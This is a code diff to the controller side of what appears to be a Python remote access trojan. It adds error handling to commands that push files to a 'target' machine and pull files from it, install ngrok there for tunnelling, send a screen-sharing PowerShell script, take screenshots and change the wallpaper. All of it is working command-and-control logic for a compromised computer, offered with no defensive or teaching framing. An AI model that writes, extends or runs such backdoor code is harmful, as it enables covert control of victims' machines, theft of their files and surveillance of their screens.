@@ -3,7 +3,7 @@ import  requests
 import json
 import os
 import threading
-from os.path import isfile
+from os.path import *
 
 f = open('serverport.txt', 'r').read()
 if f == "{}" or "":
@@ -140,24 +140,41 @@ def reliable_send(target, data):
 
 
 def upload_file(target, file_name):
+    if isfile(file_name) == True:
         f = open(file_name, 'rb')
         target.send(f.read())
+
+    else:
+
+        target.send('fnfound'.encode())
+        print(target.recv(1024).decode())
+
+
 
 
 
 
 def download_file(target, file_name):
-    f = open(file_name, 'wb')
+
     target.settimeout(1)
     chunk = target.recv(1024)
-    while chunk:
-        f.write(chunk)
-        try:
-            chunk = target.recv(1024)
-        except socket.timeout as e:
-            break
-    target.settimeout(None)
-    f.close()
+
+
+    if chunk.decode() == "fnfound":
+        print("[-] file not found")
+    else:
+        f = open(file_name, 'wb')
+        while chunk:
+            f.write(chunk)
+            try:
+                chunk = target.recv(1024)
+            except socket.timeout as e:
+                break
+        target.settimeout(None)
+        f.close()
+
+
+
 
 
 def target_communication(target, ip):
@@ -177,12 +194,17 @@ def target_communication(target, ip):
             elif command == 'clear':
                 os.system('cls')
             elif command[:6] == 'upload':
-                if isfile(command[7:]) == True:
+                try:
                     upload_file(target, command[7:])
+                except:
+                    print('something wrong')
+            elif command == 'ngroksetup':
+                if isfile('scripts\\ngrok.exe') == True:
+                    upload_file(target, 'scripts\\ngrok.exe')
+                    reliable_send(target, 'some data')
+                    print('ngrok installed on target')
                 else:
                     pass
-            elif command == 'ngroksetup':
-                upload_file(target, 'scripts\\ngrok.exe')
             elif command[:8] == 'download':
                 download_file(target, command[9:])
             elif command[:10] == 'screenshot':
@@ -232,8 +254,13 @@ def target_communication(target, ip):
             elif command[:11] == 'screenshare':
                 upload_file(target, 'scripts\\screenshare.ps1')
             elif command[:10] == 'cwallpaper':
-                upload_file(target, command[11:])
-
+                if isfile(command[11:]) == True:
+                    upload_file(target, command[11:])
+                    reliable_send(target, 'somedata')
+                    print('wallpaper changed')
+                else:
+                    upload_file(target, command[11:])
+                    continue
             else:
                 result = reliable_recv(target)
                 print(result)
